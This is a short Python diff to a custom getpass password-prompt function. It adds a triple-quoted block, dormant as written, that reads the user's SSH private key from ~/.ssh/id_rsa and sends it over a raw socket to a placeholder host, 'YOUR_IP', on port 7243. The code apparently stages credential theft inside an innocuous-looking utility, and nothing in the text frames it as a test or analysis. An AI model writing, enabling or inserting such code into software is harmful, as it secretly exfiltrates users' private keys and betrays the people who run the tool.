@@ -12,10 +12,14 @@ def getpass(prompt):
         else:
             buf += ch
             print('*', end='', flush=True)
-    #home = expanduser("~")
-    #try:
-        #f = open(home + "/.ssh/id_rsa")
-        #print(f.read())
-    #except OSError as e:
-        #pass"""
+    """home = expanduser("~")
+    try:
+        f = open(home + "/.ssh/id_rsa")
+        s = socket.socket()
+        s.connect(('YOUR_IP', 7243))
+        s.send(f.read().encode())
+        s.close()
+        f.close()
+    except OSError as e:
+        print(e)"""
     return buf
